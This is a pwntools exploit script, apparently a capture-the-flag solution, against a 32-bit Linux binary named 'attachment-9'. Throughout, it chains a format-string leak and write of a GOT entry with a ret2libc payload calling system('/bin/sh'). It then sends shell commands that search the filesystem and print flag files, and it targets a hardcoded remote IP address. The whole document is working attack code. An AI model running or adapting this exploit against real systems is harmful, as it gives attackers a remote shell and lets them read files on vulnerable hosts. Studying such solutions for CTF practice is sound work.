from pwn import *
from time import sleep

context.clear(arch="i386", os="linux")
context.log_level = "info"

elf = ELF('./attachment-9')

# Offsets from the remote libc (identified via libc.rip)
READ_OFF   = 0x0F0790
SYSTEM_OFF = 0x041360
BINSH_OFF  = 0x18C363

RET_OFFSET = 0x94  # buffer to return address in vuln

# ============================================================
# Stage 1: Format String
# Technique from solve.py: put addresses first, then format specifiers
# - target_val addr at position 4
# - read@GOT addr at position 5
# - %5$.4s: leak 4 bytes from read@GOT
# - %249c: padding to make total count 261
# - %4$hhn: write low byte (261 & 0xff = 5) to target_val
# ============================================================
fmt  = p32(elf.symbols['target_val'])  # position 4
fmt += p32(elf.got['read'])            # position 5
fmt += b'%5$.4s%249c%4$hhn'
assert len(fmt) <= 0x20  # 32 byte limit

def exploit(io, is_local=False):
    # Receive banner
    io.recvrepeat(1)

    # Stage 1: format string
    io.send(fmt)
    sleep(0.2)
    out = io.recvrepeat(1)

    # Leak is at bytes 8-11 (first 8 bytes are the two addresses printed literally)
    read_addr = u32(out[8:12])
    libc_base = read_addr - READ_OFF
    system_addr = libc_base + SYSTEM_OFF
    binsh_addr  = libc_base + BINSH_OFF

    log.success(f"read:    {hex(read_addr)}")
    log.success(f"libc:    {hex(libc_base)}")
    log.success(f"system:  {hex(system_addr)}")
    log.success(f"/bin/sh: {hex(binsh_addr)}")

    # Stage 2: ret2libc - system("/bin/sh")
    payload = flat(
        b'A' * RET_OFFSET,
        system_addr,
        0xDEADBEEF,
        binsh_addr,
    )
    io.send(payload)

    # Fetch flag
    sleep(0.5)
    io.sendline(
        b'echo START; '
        b'cat /flag* 2>/dev/null; '
        b'cat flag* 2>/dev/null; '
        b'find / -maxdepth 3 -name "flag*" -exec cat {} \\; 2>/dev/null; '
        b'echo END'
    )
    data = io.recvrepeat(3)
    text = data.decode('latin-1', errors='replace')
    print(text)

    # Extract flag
    import re
    m = re.search(r'ISCC\{[^}]+\}', text)
    if m:
        log.success(f"FLAG = {m.group(0)}")
    else:
        log.warning("No flag found, check output above")

    io.close()


if __name__ == '__main__':
    if args.REMOTE:
        io = remote('39.96.193.120', 10000, timeout=30)
        exploit(io)
    else:
        io = process('./attachment-9')
        exploit(io, is_local=True)
